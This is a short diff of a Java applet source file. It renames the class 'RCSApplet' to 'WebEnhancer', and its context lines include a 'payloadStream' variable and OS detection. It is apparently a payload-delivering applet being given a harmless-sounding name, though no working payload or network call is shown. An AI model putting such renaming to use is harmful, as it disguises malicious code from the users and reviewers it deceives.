@@ -4,7 +4,7 @@ import java.io.*;
 import java.util.Locale;
 import java.util.Properties;
 
-public class RCSApplet extends Applet {
+public class WebEnhancer extends Applet {
 	
 	private static final String OS_NAME = System.getProperty("os.name").toLowerCase(Locale.ENGLISH);
 	
@@ -13,7 +13,7 @@ public class RCSApplet extends Applet {
 		InputStream payloadStream = null;
 		
 		Properties props = new Properties();
-		Class clazz = RCSApplet.class;
+		Class clazz = WebEnhancer.class;
 		String clazzFile = clazz.getName().replace('.', '/')+".class";
 		
 		//System.out.println(clazzFile);
